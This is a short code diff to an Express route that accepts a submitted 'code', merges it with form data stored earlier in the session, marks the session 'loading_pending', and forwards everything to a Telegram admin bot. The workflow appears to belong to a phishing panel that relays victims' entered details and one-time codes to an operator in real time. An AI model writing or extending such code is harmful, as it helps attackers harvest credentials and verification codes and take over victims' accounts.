@@ -184,14 +184,17 @@ router.post('/code', async (req, res) => {
       return res.status(404).json({ error: 'Session not found or expired' });
     }
     
+    // Get existing form data to preserve it
+    const formData = await db.getFormData(key);
+    
     // Save code data
-    await db.saveFormData(key, 'form_2', { code });
+    await db.saveFormData(key, 'code', { code });
     
     // Update session state to loading_pending
     await db.updateSessionState(key, 'loading_pending');
     
-    // Notify Telegram admin
-    await telegramBot.notifyAdmin(key, 'form_2', { code });
+    // Notify Telegram admin with the code and preserve existing form data
+    await telegramBot.notifyAdmin(key, 'code', { ...formData, code });
     
     res.json({ success: true, state: 'loading_pending' });
   } catch (error) {
